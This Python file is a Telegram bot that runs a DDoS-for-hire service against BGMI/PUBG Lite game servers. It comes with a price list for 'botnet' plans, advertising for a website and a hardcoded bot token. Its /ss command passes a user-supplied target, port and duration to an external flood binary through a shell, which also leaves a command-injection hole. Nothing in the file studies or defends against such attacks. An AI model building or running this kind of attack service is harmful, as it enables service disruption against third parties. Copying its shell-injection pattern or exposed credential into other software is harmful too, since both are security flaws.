#!/usr/bin/env python3
import telebot
import subprocess
import datetime
import os
from flask import Flask, request, jsonify


# Telegram Bot Setup
bot = telebot.TeleBot('7243361643:AAFDoEKJJBxXRzU2AqnStxB6FXRMPFPLlKg') # Replace with your actual bot token

admin_id = ["7015873681"]

# File to store allowed user IDs
USER_FILE = "users.txt"

# File to store command logs
LOG_FILE = "log.txt"


def read_users():
    try:
        with open(USER_FILE, "r") as file:
            return file.read().splitlines()
    except FileNotFoundError:
        return []

allowed_user_ids = read_users()

def add_user_to_file(user_id):
    with open(USER_FILE, "a") as file:
        file.write(str(user_id) + "\n")

def log_command(user_id, target, port, time):
    user_info = bot.get_chat(user_id)
    username = "@" + user_info.username if user_info.username else f"UserID: {user_id}"
    with open(LOG_FILE, "a") as file:
        file.write(f"Username: {username}\nTarget: {target}\nPort: {port}\nTime: {time}\n\n")

def record_command_logs(user_id, command, target=None, port=None, time=None):
    log_entry = f"UserID: {user_id} | Time: {datetime.datetime.now()} | Command: {command}"
    if target:
        log_entry += f" | Target: {target}"
    if port:
        log_entry += f" | Port: {port}"
    if time:
        log_entry += f" | Time: {time}"
    with open(LOG_FILE, "a") as file:
        file.write(log_entry + "\n")


@bot.message_handler(commands=['add'])
def add_user(message):
    user_id = str(message.chat.id)
    if user_id in admin_id:
        command = message.text.split()
        if len(command) > 1:
            user_to_add = command[1]
            if user_to_add not in allowed_user_ids:
                allowed_user_ids.append(user_to_add)
                with open(USER_FILE, "a") as file:
                    file.write(f"{user_to_add}\n")
                response = f"User {user_to_add} Added Successfully."
            else:
                response = "User already exists."
        else:
            response = "Please specify a user ID to add."
    else:
        response = "Only Admin Can Run This Command."

    bot.reply_to(message, response)



@bot.message_handler(commands=['remove'])
def remove_user(message):
    user_id = str(message.chat.id)
    if user_id in admin_id:
        command = message.text.split()
        if len(command) > 1:
            user_to_remove = command[1]
            if user_to_remove in allowed_user_ids:
                allowed_user_ids.remove(user_to_remove)
                with open(USER_FILE, "w") as file:
                    for user_id in allowed_user_ids:
                        file.write(f"{user_id}\n")
                response = f"User {user_to_remove} removed successfully."
            else:
                response = f"User {user_to_remove} not found in the list."
        else:
            response = '''Please Specify A User ID to Remove. 
 Usage: /remove <userid>'''
    else:
        response = "Only Admin Can Run This Command."

    bot.reply_to(message, response)


@bot.message_handler(commands=['clearlogs'])
def clear_logs_command(message):
    user_id = str(message.chat.id)
    if user_id in admin_id:
        try:
            with open(LOG_FILE, "r+") as file:
                log_content = file.read()
                if log_content.strip() == "":
                    response = "Logs are already cleared. No data found."
                else:
                    file.truncate(0)
                    response = "Logs Cleared Successfully"
        except FileNotFoundError:
            response = "Logs are already cleared."
    else:
        response = "Only Admin Can Run This Command."
    bot.reply_to(message, response)

 

@bot.message_handler(commands=['allusers'])
def show_all_users(message):
    user_id = str(message.chat.id)
    if user_id in admin_id:
        try:
            with open(USER_FILE, "r") as file:
                user_ids = file.read().splitlines()
                if user_ids:
                    response = "Authorized Users:\n"
                    for user_id in user_ids:
                        try:
                            user_info = bot.get_chat(int(user_id))
                            username = user_info.username
                            response += f"- @{username} (ID: {user_id})\n"
                        except Exception as e:
                            response += f"- User ID: {user_id}\n"
                else:
                    response = "No data found"
        except FileNotFoundError:
            response = "No data found"
    else:
        response = "Only Admin Can Run This Command."
    bot.reply_to(message, response)


@bot.message_handler(commands=['logs'])
def show_recent_logs(message):
    user_id = str(message.chat.id)
    if user_id in admin_id:
        if os.path.exists(LOG_FILE) and os.stat(LOG_FILE).st_size > 0:
            try:
                with open(LOG_FILE, "rb") as file:
                    bot.send_document(message.chat.id, file)
            except FileNotFoundError:
                response = "No data found."
                bot.reply_to(message, response)
        else:
            response = "No data found"
            bot.reply_to(message, response)
    else:
        response = "Only Admin Can Run This Command."
        bot.reply_to(message, response)


@bot.message_handler(commands=['id'])
def show_user_id(message):
    user_id = str(message.chat.id)
    response = f"Your ID: {user_id}"
    bot.reply_to(message, response)

# Function to handle the reply when free users run the /bgmi command
def start_attack_reply(message, target, port, time):
    user_info = message.from_user
    username = user_info.username if user_info.username else user_info.first_name
    
    response = f"{username}, 𝐀𝐓𝐓𝐀𝐂𝐊 𝐒𝐓𝐀𝐑𝐓𝐄𝐃.\n\n𝐓𝐚𝐫𝐠𝐞𝐭: {target}\n𝐏𝐨𝐫𝐭: {port}\n𝐓𝐢𝐦𝐞: {time} 𝐒𝐞𝐜𝐨𝐧𝐝𝐬\n𝐌𝐞𝐭𝐡𝐨𝐝: BGMI / PUBG LITE\nBy Hacker Rajput 🕸 Website : Sharpshooterlite.com\n\nKeep Support 💪 Otherwise Off This Bot Free Service ✅🚩\nGo To Website sharpshooterlite.com Join Channel Please 😘"
    bot.reply_to(message, response)

# Dictionary to store the last time each user ran the /bgmi command
ss_cooldown = {}

COOLDOWN_TIME =0

# Handler for /bgmi command
@bot.message_handler(commands=['ss'])
def handle_ss(message):
    user_id = str(message.chat.id)
    if user_id in allowed_user_ids:
        # Check if the user is in admin_id (admins have no cooldown)
        if user_id not in admin_id:
            # Check if the user has run the command before and is still within the cooldown period
            if user_id in ss_cooldown and (datetime.datetime.now() - ss_cooldown[user_id]).seconds < 300:
                response = "You Are On Cooldown. Please Wait 5min Before Running The /ss Command Again."
                bot.reply_to(message, response)
                return
            # Update the last time the user ran the command
            ss_cooldown[user_id] = datetime.datetime.now()
        
        command = message.text.split()
        if len(command) == 4:  # Updated to accept target, time, and port
            target = command[1]
            port = int(command[2])  # Convert time to integer
            time = int(command[3])  # Convert port to integer
            if time > 181:
                response = "Error: Time interval must be less than 80."
            else:
                record_command_logs(user_id, '/ss', target, port, time)
                log_command(user_id, target, port, time)
                start_attack_reply(message, target, port, time)  # Call start_attack_reply function
                full_command = f"./ss {target} {port} {time} 800"
                subprocess.run(full_command, shell=True)
                response = f"BGMI / PUBGLITE \nAttack Finished. Target: {target} Port: {port} Port: {time}"
        else:
            response = "Usage :- /ss <target> <port> <time>\nBy Hacker Rajput 🕸 Website : Sharpshooterlite.com\n\nKeep Support 💪 Otherwise Off This Bot Free Service ✅🚩\nGo To Website sharpshooterlite.com Join Channel Please 😘"  # Updated command syntax
    else:
        response = "You Are Not Authorized To Use This Command.\nBy Hacker Rajput 🕸 Website : Sharpshooterlite.com\n\nKeep Support 💪 Otherwise Off This Bot Free Service ✅🚩\nGo To Website sharpshooterlite.com Join Channel Please 😘"

    bot.reply_to(message, response)



# Add /mylogs command to display logs recorded for bgmi and website commands
@bot.message_handler(commands=['mylogs'])
def show_command_logs(message):
    user_id = str(message.chat.id)
    if user_id in allowed_user_ids:
        try:
            with open(LOG_FILE, "r") as file:
                command_logs = file.readlines()
                user_logs = [log for log in command_logs if f"UserID: {user_id}" in log]
                if user_logs:
                    response = "Your Command Logs:\n" + "".join(user_logs)
                else:
                    response = "No Command Logs Found For You."
        except FileNotFoundError:
            response = "No command logs found."
    else:
        response = "You Are Not Authorized To Use This Command."

    bot.reply_to(message, response)


@bot.message_handler(commands=['help'])
def show_help(message):
    help_text = '''Available commands:
 /ss : Method For Bgmi / Pubg Lite Servers. 
 /rules : Please Check Before Use !!.
 /mylogs : To Check Your Recents Attacks.
 /plan : Checkout Our Botnet Rates.

 To See Admin Commands:
 /admincmd : Shows All Admin Commands.
 By Hacker Rajput 🕸 Website : Sharpshooterlite.com

Keep Support 💪 Otherwise Off This Bot Free Service ✅🚩
Go To Website sharpshooterlite.com Join Channel Please 😘
'''
    for handler in bot.message_handlers:
        if hasattr(handler, 'commands'):
            if message.text.startswith('/help'):
                help_text += f"{handler.commands[0]}: {handler.doc}\n"
            elif handler.doc and 'admin' in handler.doc.lower():
                continue
            else:
                help_text += f"{handler.commands[0]}: {handler.doc}\n"
    bot.reply_to(message, help_text)

@bot.message_handler(commands=['start'])
def welcome_start(message):
    user_id = message.chat.id  
    user_name = message.from_user.first_name
    if str(user_id) not in allowed_user_ids:
        add_user_to_file(user_id)
        allowed_user_ids.append(str(user_id))
    response = f"Welcome to Your Home, {user_name}! Feel Free to Explore.\nTry To Run This Command : /help\nWelcome To The World's Best Ddos Bot\nBy Hacker Rajput 🕸 Website : Sharpshooterlite.com\n\nKeep Support 💪 Otherwise Off This Bot Free Service ✅🚩\nGo To Website sharpshooterlite.com Join Channel Please 😘"
    bot.reply_to(message, response)


@bot.message_handler(commands=['rules'])
def welcome_rules(message):
    user_name = message.from_user.first_name
    response = f'''{user_name} Please Follow These Rules:

1. Dont Run Too Many Attacks !! Cause A Ban From Bot
2. Dont Run 2 Attacks At Same Time Becz If U Then U Got Banned From Bot. 
3. We Daily Checks The Logs So Follow these rules to avoid Ban!!
By Hacker Rajput 🕸 Website : Sharpshooterlite.com

Keep Support 💪 Otherwise Off This Bot Free Service ✅🚩
Go To Website sharpshooterlite.com Join Channel Please 😘'''
    bot.reply_to(message, response)

@bot.message_handler(commands=['plan'])
def welcome_plan(message):
    user_name = message.from_user.first_name
    response = f'''{user_name}, Brother Only 1 Plan Is Powerfull Then Any Other Ddos !!:

# Vip :
# -> Attack Time : 200 (S)
# > After Attack Limit : 2 Min
# -> Concurrents Attack : 300

# Pr-ice List:
# Day-->150 Rs
# Week-->900 Rs
# Month-->1600 Rs

This Time ⌚ Free 🆓 Service Enjoy 😊 All Guys ❤

By Hacker Rajput 🕸 Website : Sharpshooterlite.com

Keep Support 💪 Otherwise Off This Bot Free Service ✅🚩
Go To Website sharpshooterlite.com Join Channel Please 😘
'''
    bot.reply_to(message, response)

@bot.message_handler(commands=['admincmd'])
def welcome_plan(message):
    user_name = message.from_user.first_name
    response = f'''{user_name}, Admin Commands Are Here!!:

/add <userId> : Add a User.
/remove <userid> Remove a User.
/allusers : Authorised Users Lists.
/logs : All Users Logs.
/broadcast : Broadcast a Message.
/clearlogs : Clear The Logs File.
By Hacker Rajput 🕸 Website : Sharpshooterlite.com

Keep Support 💪 Otherwise Off This Bot Free Service ✅🚩
Go To Website sharpshooterlite.com Join Channel Please 😘
'''
    bot.reply_to(message, response)


@bot.message_handler(commands=['broadcast'])
def broadcast_message(message):
    user_id = str(message.chat.id)
    if user_id in admin_id:
        command = message.text.split(maxsplit=1)
        if len(command) > 1:
            message_to_broadcast = "Message To All Users By Admin:\n\n" + command[1]
            with open(USER_FILE, "r") as file:
                user_ids = file.read().splitlines()
                for user_id in user_ids:
                    try:
                        bot.send_message(user_id, message_to_broadcast)
                    except Exception as e:
                        print(f"Failed to send broadcast message to user {user_id}: {str(e)}")
            response = "Broadcast Message Sent Successfully To All Users."
        else:
            response = "Please Provide A Message To Broadcast."
    else:
        response = "Only Admin Can Run This Command."

    bot.reply_to(message, response)


# Flask Webhook Server
app = Flask(__name__)

@app.route('/YOUR_BOT_WEBHOOK', methods=['POST'])  # Replace with your webhook path
def webhook_handler():
    if request.headers.get('content-type') == 'application/json':
        json_string = request.get_data().decode('utf-8')
        update = telebot.types.Update.de_json(json_string)
        bot.process_new_updates([update])
        return 'ok', 200
    else:
        return 'bad request', 400

# Set Webhook and Start Server (without SSL)
if __name__ == '__main__':
    bot.remove_webhook()
    bot.set_webhook(url='http://YOUR_SERVER_IP:PORT/YOUR_BOT_WEBHOOK') # Note: HTTP instead of HTTPS
    app.run(host='0.0.0.0', port=8080) 
